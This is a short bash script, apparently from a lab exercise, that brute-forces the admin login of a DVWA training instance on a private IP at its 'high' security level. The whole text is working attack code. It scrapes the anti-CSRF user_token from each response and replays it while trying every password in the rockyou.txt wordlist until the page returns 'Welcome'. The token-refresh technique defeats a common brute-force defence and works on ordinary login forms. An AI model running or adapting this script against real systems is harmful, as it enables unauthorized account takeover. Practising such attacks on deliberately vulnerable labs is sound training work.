

# Set the target URL
url="<http://192.168.52.102/dvwa/vulnerabilities/brute
/>"
# Set the headers (replace with the actual cookies 
from your session)
cookie="security=high; 
PHPSESSID=3525c7fbfe689c7fb88fa6258d9f5789"


# Function to get user_token
get_user_token() {
 response=$(curl -s -H "Cookie: $cookie" "$url")
 user_token=$(echo "$response" | grep -oP 
'(?<=name="user_token" value=").+?(?=")')
 echo "$user_token"
}

# Path to the wordlist
wordlist="/usr/share/wordlists/rockyou.txt"

# Read the wordlist and try to log in with each 
password
while IFS= read -r password || [[ -n "$password" ]]; 
do
 # Clean the password string
 password=$(echo "$password" | tr -d '\r')
 echo "Checking password: $password"


#  Send a request with the current password
 response=$(curl -s -G -H "Cookie: $cookie" \
 --data-urlencode "username=admin" \
 --data-urlencode "password=$password" \
 --data-urlencode "Login=Login" \
 --data-urlencode "user_token=$user_token" \
 "$url")


# Check for the welcome message in the response
 if echo "$response" | grep -q "Welcome"; then
 echo "LoggedIn: username: admin , password: 
$password ===found==="
 break
 fi


# Get the new user_token for the next request
 user_token=$(echo "$response" | grep -oP 
'(?<=name="user_token" value=").+?(?=")')
done < "$wordlist"
